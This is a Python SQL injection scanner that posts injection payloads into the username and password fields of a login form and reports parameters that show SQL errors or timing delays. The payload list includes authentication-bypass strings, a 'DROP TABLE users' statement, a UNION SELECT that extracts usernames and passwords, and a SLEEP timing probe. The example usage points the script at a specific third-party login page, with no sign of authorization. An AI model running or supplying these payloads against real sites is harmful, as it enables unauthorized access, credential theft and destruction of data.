import requests
from urllib.parse import urlparse, urljoin

def test_sql_injection(target_url, params=None, method='GET'):
    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1; --",
        "'; DROP TABLE users; --",
        "' UNION SELECT null, username, password FROM users --",
        "' OR 'a'='a';#",
        "' OR 1=1 LIMIT 1 --",
        "' OR SLEEP(5) --"
    ]
    
    vulnerable_params = []
    
    try:
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] += payload
                
                if method.upper() == 'GET':
                    response = requests.get(target_url, params=test_params)
                else:
                    response = requests.post(target_url, data=test_params)
                
                # Detection heuristics [3][4]
                if any(indicator in response.text.lower() for indicator in 
                      ['error in your sql syntax', 'warning: mysql', 
                       'unclosed quotation mark', 'syntax error']):
                    vulnerable_params.append((param, payload))
                    break
                    
                if response.elapsed.total_seconds() > 5:  # Time-based detection
                    vulnerable_params.append((param, payload))
                    break
                    
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
    
    return vulnerable_params

# Example usage
if __name__ == "__main__":
    target = "https://trakka.net/login"
    parameters = {
        "username": "test",
        "password": "test123"
    }
    
    vulnerabilities = test_sql_injection(target, params=parameters, method='POST')
    
    if vulnerabilities:
        print("[!] Potential SQLi vulnerabilities found:")
        for param, payload in vulnerabilities:
            print(f"Parameter: {param} | Payload: {payload}")
    else:
        print("[+] No obvious SQLi vulnerabilities detected")
